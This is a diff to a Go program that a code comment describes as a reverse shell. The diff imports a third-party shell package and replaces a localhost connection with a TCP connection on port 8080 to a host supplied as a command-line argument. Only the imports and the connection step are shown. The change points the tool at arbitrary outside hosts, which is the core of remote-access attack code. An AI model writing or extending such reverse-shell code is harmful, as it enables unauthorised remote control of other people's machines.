@@ -1,11 +1,13 @@
 package main
 
-import "net"
-import "fmt"
-import "bufio"
-import "time"
-import "math/rand"
-import "strings"
+import (
+	"bufio"
+	"fmt"
+	"net"
+	"os"
+	"strings"
+	"github.com/GoPotUrself/shell"
+)
 
 /*
 So a few floating things here:
@@ -21,7 +23,8 @@ func main() {
 	
 	
 	//connect to this socket
-	conn, _ := net.Dial("tcp", "127.0.0.1:8080")
+	address := os.Args[1] + ":8080"
+	conn, _ := net.Dial("tcp", address)
 	
 	/*
 	Displays the initial reverse shell, improvements:
